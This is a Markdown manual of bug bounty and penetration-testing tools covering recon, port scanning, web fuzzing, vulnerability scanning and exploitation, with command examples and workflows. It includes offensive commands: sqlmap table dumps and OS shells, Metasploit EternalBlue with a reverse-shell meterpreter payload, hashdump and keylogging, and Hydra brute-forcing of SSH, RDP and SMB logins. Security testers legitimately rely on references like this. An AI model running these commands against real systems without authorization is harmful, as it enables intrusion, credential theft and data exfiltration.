# Bug Bounty Tools - Complete Manual

## Table of Contents
1. [Reconnaissance Tools](#reconnaissance-tools)
2. [Port Scanning Tools](#port-scanning-tools)
3. [Web Scanning Tools](#web-scanning-tools)
4. [Vulnerability Scanning](#vulnerability-scanning)
5. [Exploitation Tools](#exploitation-tools)
6. [Workflow Examples](#workflow-examples)

---

## Reconnaissance Tools

### Subfinder - Subdomain Discovery
**Purpose:** Fast passive subdomain discovery

**Basic Usage:**
```bash
subfinder -d target.com
```

**Common Options:**
```bash
# Save to file
subfinder -d target.com -o subdomains.txt

# Silent mode (only results)
subfinder -d target.com -silent

# Use all sources
subfinder -d target.com -all

# Multiple domains from file
subfinder -dL domains.txt -o results.txt

# Exclude sources
subfinder -d target.com -es shodan,censys
```

**Output Format:**
- One subdomain per line
- Example: `admin.target.com`

**Pro Tips:**
- Combine with other tools: `subfinder -d target.com | httpx`
- Use `-all` for maximum coverage
- Silent mode is perfect for piping to other tools

---

### Amass - Advanced Subdomain Enumeration
**Purpose:** In-depth network mapping and asset discovery

**Basic Usage:**
```bash
amass enum -d target.com
```

**Common Options:**
```bash
# Passive enumeration only (no DNS queries)
amass enum -passive -d target.com

# Active enumeration (includes DNS)
amass enum -active -d target.com

# With brute force
amass enum -brute -d target.com

# Output to file
amass enum -d target.com -o results.txt

# Verbose output
amass enum -v -d target.com

# Use specific DNS resolvers
amass enum -d target.com -rf resolvers.txt

# Timeout
amass enum -d target.com -timeout 30
```

**Configuration:**
Create `~/.config/amass/config.ini` for API keys (VirusTotal, SecurityTrails, etc.)

**Pro Tips:**
- Slower but more thorough than Subfinder
- Use passive mode first, then active
- Great for ASN enumeration

---

### Httpx - HTTP Probe
**Purpose:** Verify live HTTP/HTTPS servers

**Basic Usage:**
```bash
cat subdomains.txt | httpx
```

**Common Options:**
```bash
# Silent mode
cat subdomains.txt | httpx -silent

# Show status codes
cat subdomains.txt | httpx -status-code

# Show response titles
cat subdomains.txt | httpx -title

# Show technologies
cat subdomains.txt | httpx -tech-detect

# Extract specific headers
cat subdomains.txt | httpx -include-response-header

# Follow redirects
cat subdomains.txt | httpx -follow-redirects

# Save output
cat subdomains.txt | httpx -o live_hosts.txt

# Screenshot
cat subdomains.txt | httpx -screenshot

# Full response
cat subdomains.txt | httpx -response-data
```

**Pro Tips:**
- Always verify subdomains before scanning
- Use `-tech-detect` to identify technologies
- Combine with other tools: `httpx | nuclei`

---

### Katana - Web Crawler
**Purpose:** Crawl websites to discover endpoints

**Basic Usage:**
```bash
katana -u https://target.com
```

**Common Options:**
```bash
# Crawl depth
katana -u https://target.com -d 5

# JS file parsing
katana -u https://target.com -jc

# Save output
katana -u https://target.com -o endpoints.txt

# Multiple URLs from file
katana -list urls.txt

# Filter by extension
katana -u https://target.com -em js,php,json

# Include subdomains
katana -u https://target.com -cs

# Custom headers
katana -u https://target.com -H "Cookie: session=123"

# Rate limit
katana -u https://target.com -rl 150
```

**Pro Tips:**
- Great for discovering hidden endpoints
- Always parse JavaScript files (`-jc`)
- Combine with parameter discovery tools

---

### Waybackurls - Historical URL Discovery
**Purpose:** Fetch URLs from Internet Archive

**Basic Usage:**
```bash
waybackurls target.com
```

**Common Options:**
```bash
# Get dates too
waybackurls -dates target.com

# No subdomains
waybackurls -no-subs target.com

# Save output
waybackurls target.com > wayback_urls.txt

# Filter for specific extensions
waybackurls target.com | grep -E "\.js$|\.php$"

# Remove duplicates
waybackurls target.com | sort -u
```

**Pro Tips:**
- Often finds old/forgotten endpoints
- Look for API endpoints, admin panels
- Check for exposed credentials in URLs

---

### Gau (GetAllUrls) - URL Collector
**Purpose:** Fetch known URLs from multiple sources

**Basic Usage:**
```bash
gau target.com
```

**Common Options:**
```bash
# Include subdomains
gau --subs target.com

# Output to file
gau target.com -o urls.txt

# Filter by status code
gau target.com | httpx -mc 200

# Specific providers
gau --providers wayback,commoncrawl target.com

# Max retries
gau --retries 5 target.com
```

**Pro Tips:**
- Combines Wayback, Common Crawl, etc.
- Often more URLs than waybackurls alone
- Great for finding forgotten endpoints

---

### AbuseIPDB
**Purpose:** IP report database and Whois lookup

[Site link here](https://www.abuseipdb.com)

---

### Cisco Talos intelligence
**Purpose:** IP report database and Whois lookup

[Site link here](https://talosintelligence.com)

---

## Port Scanning Tools

### Rustscan - Fast Port Scanner
**Purpose:** Ultra-fast port scanning

**Basic Usage:**
```bash
rustscan -a target.com
```

**Common Options:**
```bash
# Scan specific ports
rustscan -a target.com -p 80,443,8080

# Scan port range
rustscan -a target.com --range 1-1000

# Ulimit (connection limit)
rustscan -a target.com --ulimit 5000

# Batch scanning
rustscan -a target.com -b 1000

# Save output
rustscan -a target.com -o scan.txt

# Quiet mode
rustscan -a target.com -q

# Scripts (run nmap after)
rustscan -a target.com -- -sV -sC
```

**Pro Tips:**
- Much faster than nmap for initial scans
- Use `--ulimit 5000` for speed
- Pipe to nmap for detailed scans

---

### Nmap - Network Mapper
**Purpose:** Comprehensive network scanning

**Basic Usage:**
```bash
nmap target.com
```

**Common Scans:**
```bash
# Quick scan (top 1000 ports)
nmap target.com

# Service/version detection
nmap -sV target.com

# OS detection
nmap -O target.com

# Script scan (default scripts)
nmap -sC target.com

# Aggressive scan (OS + version + scripts + traceroute)
nmap -A target.com

# All ports
nmap -p- target.com

# Specific ports
nmap -p 80,443,8080 target.com

# UDP scan
nmap -sU target.com

# Stealth/SYN scan
nmap -sS target.com

# Save output (all formats)
nmap -oA scan_results target.com

# Fast scan
nmap -T4 target.com

# Slow/evasive scan
nmap -T2 target.com
```

**Useful Scripts:**
```bash
# Vulnerability scan
nmap --script vuln target.com

# HTTP enumeration
nmap --script http-enum target.com

# SSL/TLS info
nmap --script ssl-enum-ciphers -p 443 target.com

# SMB enumeration
nmap --script smb-enum-shares -p 445 target.com
```

**Pro Tips:**
- Always use `-sV` for service detection
- `-A` is noisy but comprehensive
- Save all formats with `-oA`

---

### Masscan - Mass Port Scanner
**Purpose:** Internet-scale port scanner

**Basic Usage:**
```bash
masscan target.com -p1-65535
```

**Common Options:**
```bash
# Scan rate (packets per second)
masscan target.com -p80,443 --rate=1000

# All ports
masscan target.com -p1-65535 --rate=10000

# Output formats
masscan target.com -p80 -oL output.txt
masscan target.com -p80 -oJ output.json

# Exclude ports
masscan target.com -p1-65535 --exclud ports 22,21

# Banner grabbing
masscan target.com -p80 --banners
```

**Pro Tips:**
- Extremely fast but less accurate than nmap
- Use for initial discovery, then nmap for details
- Be careful with rate limits on VPS

---

## Web Scanning Tools

### Ffuf - Web Fuzzer
**Purpose:** Fast web fuzzer for content discovery

**Basic Usage:**
```bash
ffuf -u https://target.com/FUZZ -w wordlist.txt
```

**Common Options:**
```bash
# Directory fuzzing
ffuf -u https://target.com/FUZZ -w ~/bugbounty-tools/wordlists/common.txt

# Subdomain fuzzing
ffuf -u https://FUZZ.target.com -w subdomains.txt

# Virtual host discovery
ffuf -u https://target.com -H "Host: FUZZ.target.com" -w vhosts.txt

# Parameter fuzzing (GET)
ffuf -u https://target.com?FUZZ=test -w params.txt

# Parameter fuzzing (POST)
ffuf -u https://target.com -X POST -d "FUZZ=test" -w params.txt

# Filter by status code
ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302

# Filter by size
ffuf -u https://target.com/FUZZ -w wordlist.txt -fs 4242

# Match regex
ffuf -u https://target.com/FUZZ -w wordlist.txt -mr "admin"

# Rate limiting
ffuf -u https://target.com/FUZZ -w wordlist.txt -rate 100

# Recursion
ffuf -u https://target.com/FUZZ -w wordlist.txt -recursion

# Output to file
ffuf -u https://target.com/FUZZ -w wordlist.txt -o results.json
```

**Pro Tips:**
- `-fs` to filter false positives by size
- `-mc` to match only interesting status codes
- Always use `-rate` to avoid blocking

---

### Gobuster - Directory/DNS/Vhost Bruteforce
**Purpose:** Brute force URLs, DNS, and virtual hosts

**Basic Usage:**
```bash
gobuster dir -u https://target.com -w wordlist.txt
```

**Directory Mode:**
```bash
# Basic directory scan
gobuster dir -u https://target.com -w wordlist.txt

# With extensions
gobuster dir -u https://target.com -w wordlist.txt -x php,html,js

# Show response length
gobuster dir -u https://target.com -w wordlist.txt -l

# Follow redirects
gobuster dir -u https://target.com -w wordlist.txt -r

# Use cookies
gobuster dir -u https://target.com -w wordlist.txt -c "session=abc123"

# Custom user agent
gobuster dir -u https://target.com -w wordlist.txt -a "MyUserAgent"

# Output to file
gobuster dir -u https://target.com -w wordlist.txt -o results.txt

# Status codes to show
gobuster dir -u https://target.com -w wordlist.txt -s "200,204,301,302,307,401,403"
```

**DNS Mode:**
```bash
# Subdomain enumeration
gobuster dns -d target.com -w subdomains.txt

# Show IPs
gobuster dns -d target.com -w subdomains.txt -i

# Use specific resolver
gobuster dns -d target.com -w subdomains.txt -r 8.8.8.8
```

**Vhost Mode:**
```bash
# Virtual host discovery
gobuster vhost -u https://target.com -w vhosts.txt
```

**Pro Tips:**
- Use `-x` for file extensions
- DNS mode is great for subdomain brute force
- Combine with ffuf for comprehensive scanning

---

### Feroxbuster - Recursive Content Discovery
**Purpose:** Fast recursive content discovery

**Basic Usage:**
```bash
feroxbuster -u https://target.com
```

**Common Options:**
```bash
# Basic scan with wordlist
feroxbuster -u https://target.com -w wordlist.txt

# Recursive depth
feroxbuster -u https://target.com -d 3

# With extensions
feroxbuster -u https://target.com -x php,html,js

# Filter status codes
feroxbuster -u https://target.com -C 404

# Rate limiting (requests per second)
feroxbuster -u https://target.com --rate-limit 50

# Threads
feroxbuster -u https://target.com -t 50

# Save state (resume later)
feroxbuster -u https://target.com --resume-from ferox-state.txt

# Output to file
feroxbuster -u https://target.com -o results.txt

# Silent mode
feroxbuster -u https://target.com -q

# Extract links
feroxbuster -u https://target.com --extract-links
```

**Pro Tips:**
- Automatically recursive (unlike ffuf)
- Great for discovering deep directory structures
- Use `--extract-links` to find hidden paths

---

### Dirsearch - Web Path Scanner
**Purpose:** Simple directory/file brute forcer

**Basic Usage:**
```bash
python3 ~/bugbounty-tools/dirsearch/dirsearch.py -u https://target.com
```

**Common Options:**
```bash
# With extensions
python3 dirsearch.py -u https://target.com -e php,html,js

# Custom wordlist
python3 dirsearch.py -u https://target.com -w wordlist.txt

# Recursive
python3 dirsearch.py -u https://target.com -r

# Exclude status codes
python3 dirsearch.py -u https://target.com -x 403,404

# Threads
python3 dirsearch.py -u https://target.com -t 50

# Save report
python3 dirsearch.py -u https://target.com -o report.txt

# Multiple URLs
python3 dirsearch.py -l urls.txt
```

**Pro Tips:**
- Good default wordlist included
- Simple and reliable
- Use for quick scans

---

## Vulnerability Scanning

### Nuclei - Vulnerability Scanner
**Purpose:** Fast vulnerability scanner using templates

**Basic Usage:**
```bash
nuclei -u https://target.com
```

**Common Options:**
```bash
# Scan single URL
nuclei -u https://target.com

# Scan multiple URLs
nuclei -l urls.txt

# Specific template
nuclei -u https://target.com -t cves/2021/CVE-2021-44228.yaml

# Template directory
nuclei -u https://target.com -t ~/nuclei-templates/cves/

# Severity filter
nuclei -u https://target.com -severity critical,high

# Exclude templates
nuclei -u https://target.com -exclude-severity info

# Rate limiting
nuclei -u https://target.com -rl 150

# Bulk scan
nuclei -l urls.txt -bs 25

# Output to file
nuclei -u https://target.com -o results.txt

# JSON output
nuclei -u https://target.com -json -o results.json

# Silent mode
nuclei -u https://target.com -silent

# Update templates
nuclei -update-templates
```

**Template Categories:**
- `cves/` - CVE vulnerabilities
- `vulnerabilities/` - Various vulnerabilities
- `exposures/` - Information disclosure
- `misconfigurations/` - Security misconfigurations
- `takeovers/` - Subdomain takeovers
- `technologies/` - Technology detection

**Pro Tips:**
- Update templates regularly
- Use severity filters to prioritize
- Create custom templates for your targets

---

### Nikto - Web Server Scanner
**Purpose:** Web server vulnerability scanner

**Basic Usage:**
```bash
nikto -h https://target.com
```

**Common Options:**
```bash
# Basic scan
nikto -h https://target.com

# SSL/TLS scan
nikto -h https://target.com -ssl

# Specific port
nikto -h target.com -p 8080

# Save output
nikto -h https://target.com -o report.txt

# Format output (txt, html, csv)
nikto -h https://target.com -Format html -o report.html

# Use proxy
nikto -h https://target.com -useproxy http://127.0.0.1:8080

# Tuning (test specific categories)
nikto -h https://target.com -Tuning 123

# Update databases
nikto -update
```

**Tuning Options:**
- 1: Interesting files
- 2: Misconfiguration
- 3: Information disclosure
- 4: Injection (XSS/Script/HTML)
- 5: Remote file retrieval
- 6: Denial of service
- 7: Remote file retrieval (inside web root)
- 8: Command execution
- 9: SQL injection

**Pro Tips:**
- Generates lots of traffic (noisy)
- Good for initial assessment
- Always review false positives

---

### SQLMap - SQL Injection Tool
**Purpose:** Automatic SQL injection and database takeover

**Basic Usage:**
```bash
sqlmap -u "https://target.com?id=1"
```

**Common Options:**
```bash
# Basic GET parameter test
sqlmap -u "https://target.com?id=1"

# POST request
sqlmap -u "https://target.com" --data="id=1&user=admin"

# Using request file
sqlmap -r request.txt

# Cookie-based injection
sqlmap -u "https://target.com" --cookie="PHPSESSID=abc123"

# Test specific parameter
sqlmap -u "https://target.com?id=1&page=2" -p id

# Database enumeration
sqlmap -u "https://target.com?id=1" --dbs

# Tables in database
sqlmap -u "https://target.com?id=1" -D dbname --tables

# Dump table
sqlmap -u "https://target.com?id=1" -D dbname -T users --dump

# OS shell
sqlmap -u "https://target.com?id=1" --os-shell

# Level and risk
sqlmap -u "https://target.com?id=1" --level=5 --risk=3

# Batch mode (no prompts)
sqlmap -u "https://target.com?id=1" --batch

# Threads (faster)
sqlmap -u "https://target.com?id=1" --threads=10
```

**Pro Tips:**
- Always test with permission
- Start with level 1, increase if needed
- Use `--batch` for automation
- Save session data

---

### Dalfox - XSS Scanner
**Purpose:** Fast XSS scanner and parameter analyzer

**Basic Usage:**
```bash
dalfox url https://target.com
```

**Common Options:**
```bash
# Single URL
dalfox url https://target.com

# Multiple URLs from file
dalfox file urls.txt

# Pipe mode
cat urls.txt | dalfox pipe

# Specific parameter
dalfox url "https://target.com?q=test" -p q

# Custom payloads
dalfox url https://target.com --custom-payload="<img src=x>"

# Blind XSS (with callback)
dalfox url https://target.com --blind https://your-callback.com

# POC generation
dalfox url https://target.com --poc

# Output to file
dalfox url https://target.com -o results.txt

# Silent mode
dalfox url https://target.com --silence

# Follow redirects
dalfox url https://target.com --follow-redirects
```

**Pro Tips:**
- Use `--poc` for proof of concepts
- Test blind XSS with your own callback server
- Combine with parameter discovery tools

---

## Exploitation Tools

### Metasploit - Exploitation Framework
**Purpose:** Comprehensive exploitation framework

**Basic Usage:**
```bash
msfconsole
```

**Common Commands:**
```bash
# Start Metasploit
msfconsole

# Search for exploits
search apache
search type:exploit platform:linux

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue

# Show exploit info
info

# Show options
show options

# Set target
set RHOSTS 192.168.1.100

# Set payload
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444

# Run exploit
exploit

# Background session
background

# List sessions
sessions -l

# Interact with session
sessions -i 1
```

**Meterpreter Commands:**
```bash
# System info
sysinfo

# Get user
getuid

# Privilege escalation
getsystem

# Hash dump
hashdump

# Screenshot
screenshot

# Keylogger
keyscan_start
keyscan_dump

# Upload file
upload /path/local /path/remote

# Download file
download /path/remote /path/local

# Shell
shell
```

**Pro Tips:**
- Always use with authorization
- Update regularly: `apt update metasploit-framework`
- Use workspaces to organize targets

---

### Hydra - Login Brute Forcer
**Purpose:** Fast network login brute forcer

**Basic Usage:**
```bash
hydra -l admin -P passwords.txt ssh://target.com
```

**Common Services:**
```bash
# SSH
hydra -l root -P passwords.txt ssh://target.com

# FTP
hydra -l admin -P passwords.txt ftp://target.com

# HTTP POST form
hydra -l admin -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# HTTP Basic Auth
hydra -l admin -P passwords.txt target.com http-get /admin

# RDP
hydra -l administrator -P passwords.txt rdp://target.com

# SMB
hydra -l administrator -P passwords.txt smb://target.com

# MySQL
hydra -l root -P passwords.txt mysql://target.com

# Multiple usernames
hydra -L users.txt -P passwords.txt ssh://target.com

# Single password
hydra -L users.txt -p Password123 ssh://target.com

# Threads
hydra -l admin -P passwords.txt ssh://target.com -t 4

# Verbose
hydra -l admin -P passwords.txt ssh://target.com -v

# Resume
hydra -R
```

**Pro Tips:**
- Use `-t` carefully (too many threads = detection)
- Always check legal authorization
- Combine with leaked password lists

---

## Workflow Examples

### Complete Reconnaissance Workflow
```bash
# 1. Subdomain enumeration
subfinder -d target.com -o subs.txt
amass enum -passive -d target.com -o amass_subs.txt
cat subs.txt amass_subs.txt | sort -u > all_subs.txt

# 2. Check live hosts
cat all_subs.txt | httpx -silent -o live.txt

# 3. Gather URLs
cat live.txt | waybackurls > urls.txt
cat live.txt | gau >> urls.txt
sort -u urls.txt -o urls_unique.txt

# 4. Port scanning
cat live.txt | while read host; do
    rustscan -a "$host" --ulimit 5000 >> ports.txt
done

# 5. Screenshot and tech detection
cat live.txt | httpx -tech-detect -screenshot -silent
```

### Vulnerability Assessment Workflow
```bash
# 1. Nuclei scan
nuclei -l live.txt -severity critical,high,medium -o vulns.txt

# 2. Nikto scan on web servers
cat live.txt | while read url; do
    nikto -h "$url" -o "nikto_$(echo $url | tr '/:' '_').txt"
done

# 3. Check for common vulnerabilities
nuclei -l live.txt -t ~/nuclei-templates/cves/ -o cves.txt
nuclei -l live.txt -t ~/nuclei-templates/exposures/ -o exposures.txt
```

### Directory/Content Discovery Workflow
```bash
# 1. Quick scan with common wordlist
cat live.txt | while read url; do
    ffuf -u "$url/FUZZ" -w ~/bugbounty-tools/wordlists/common.txt -mc 200,301,302,403 -o "ffuf_$(echo $url | tr '/:' '_').json"
done

# 2. Recursive scan on interesting targets
feroxbuster -u https://interesting-target.com -w ~/bugbounty-tools/wordlists/big.txt -d 3 -o ferox_results.txt

# 3. JavaScript file discovery
cat urls_unique.txt | grep "\.js$" > js_files.txt
```

### Parameter Discovery Workflow
```bash
# 1. Find parameters from URLs
cat urls_unique.txt | grep "?" | cut -d "?" -f2 | cut -d "&" -f1 | cut -d "=" -f1 | sort -u > params.txt

# 2. Parameter fuzzing
arjun -i urls.txt -o found_params.json

# 3. Test for XSS on parameters
cat urls_with_params.txt | dalfox pipe -o xss_results.txt

# 4. Test for SQL injection
cat urls_with_params.txt | while read url; do
    sqlmap -u "$url" --batch --level=1 --risk=1
done
```

---

## Tips for Raspberry Pi Performance

### Optimize for Limited Resources
```bash
# Use screen/tmux for long-running scans
screen -S recon
# or
tmux new -s recon

# Limit threads/connections
nuclei -l urls.txt -bs 10  # Smaller batch size
ffuf -u URL -w wordlist -t 20  # Fewer threads

# Use rate limiting
subfinder -d target.com -rl 10
nuclei -u https://target.com -rl 50
```

### Monitor Resources
```bash
# Check CPU/memory
htop

# Check disk space
df -h

# Monitor network
iftop
```

---

## Quick Reference Card

**Save this to ~/bugbounty-tools/cheatsheet.txt:**

```
RECON:
  subfinder -d $DOM -silent | httpx -silent | tee live.txt
  waybackurls $DOM | tee urls.txt
  rustscan -a $IP --ulimit 5000

SCAN:
  nuclei -l live.txt -severity critical,high -o vulns.txt
  ffuf -u https://$DOM/FUZZ -w wordlist.txt -mc 200,301,302
  nikto -h https://$DOM -o nikto.txt

VULN TESTING:
  dalfox url "https://$DOM?param=test"
  sqlmap -u "https://$DOM?id=1" --batch
  
EXPLOIT:
  msfconsole
  hydra -l admin -P pass.txt ssh://$IP
```

---
